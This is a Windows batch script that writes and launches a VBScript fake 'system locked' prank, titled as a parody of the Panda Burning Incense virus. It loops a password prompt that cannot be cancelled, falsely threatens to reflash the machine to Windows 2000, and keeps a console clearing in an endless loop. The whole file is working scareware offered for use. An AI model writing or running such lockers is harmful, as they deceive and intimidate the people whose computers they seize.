@echo off
chcp 936 >nul
color 04
title 野鸡烧香 系统警告

:: 生成无Beep命令的VBS脚本
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\lock.vbs"
echo key = "131025" >> "%temp%\lock.vbs"
echo Do >> "%temp%\lock.vbs"
echo     usr = InputBox(vbCrLf ^& vbCrLf ^& "        野 鸡 烧 香" ^& vbCrLf ^& vbCrLf ^& "        系统已锁定" ^& vbCrLf ^& vbCrLf ^& "        请输入解锁密码：", "危险警告") >> "%temp%\lock.vbs"
echo     If usr = "" Then >> "%temp%\lock.vbs"
echo         MsgBox "取消无效！必须输入密码！", 16, "警告" >> "%temp%\lock.vbs"
echo     ElseIf usr = key Then >> "%temp%\lock.vbs"
echo         WshShell.Run "taskkill /f /im cmd.exe", 0 >> "%temp%\lock.vbs"
echo         MsgBox "解锁成功！", 64, "完成" >> "%temp%\lock.vbs"
echo         WScript.Quit >> "%temp%\lock.vbs"
echo     Else >> "%temp%\lock.vbs"
echo         MsgBox "密码错误，系统即将被喻某人刷成Windows2000！", 16, "错误" >> "%temp%\lock.vbs"
echo     End If >> "%temp%\lock.vbs"
echo Loop >> "%temp%\lock.vbs"

:: 运行锁机脚本
start "" wscript.exe "%temp%\lock.vbs"

:: 全屏纯黑背景
:blackloop
cls
ping -n 1 127.0.0.1 >nul
goto blackloop
